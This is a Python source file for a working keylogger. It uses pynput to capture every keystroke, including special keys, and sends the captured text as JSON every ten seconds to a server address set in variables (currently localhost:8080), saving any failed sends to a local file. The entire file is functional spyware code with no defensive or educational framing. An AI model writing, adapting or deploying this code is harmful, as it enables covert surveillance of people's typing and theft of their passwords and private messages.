from pynput import keyboard
import requests
import json
import threading

text = ""
time_interval = 10  # Time interval in seconds
ip_address = "localhost"
port_number = "8080"


def send_post_req():
    global text
    try:
        payload = json.dumps({"keyboardData": text})
        r = requests.post(f"http://{ip_address}:{port_number}", data=payload, headers={"Content-Type": "application/json"})
        if r.status_code == 200:
            print("Logs successfully sent!")
            text = ""  # Clear text after a successful send
        else:
            raise Exception(f"Server error: {r.status_code}, {r.text}")
    except Exception as e:
        print(f"Error sending logs: {e}")
        with open("unsend_logs.txt", "a") as f:
            f.write(text + "\n")
    finally:
        timer = threading.Timer(time_interval, send_post_req)
        timer.start()


def on_press(key):
    global text
    try:
        if key == keyboard.Key.enter:
            text += "\n"
        elif key == keyboard.Key.tab:
            text += "\t"
        elif key == keyboard.Key.space:
            text += " "
        elif key == keyboard.Key.shift:
            pass
        elif key == keyboard.Key.backspace and len(text) == 0:
            pass
        elif key == keyboard.Key.backspace and len(text) > 0:
            text = text[:-1]
        elif key in [keyboard.Key.ctrl_l, keyboard.Key.ctrl_r]:
            text += "[Ctrl]"
        elif key == keyboard.Key.esc:
            return False
        else:
            text += str(key).strip(" ' ")
    except Exception as e:
        print(f"Error processing key: {e}")


with keyboard.Listener(on_press=on_press) as listener:
    send_post_req()
    listener.join()
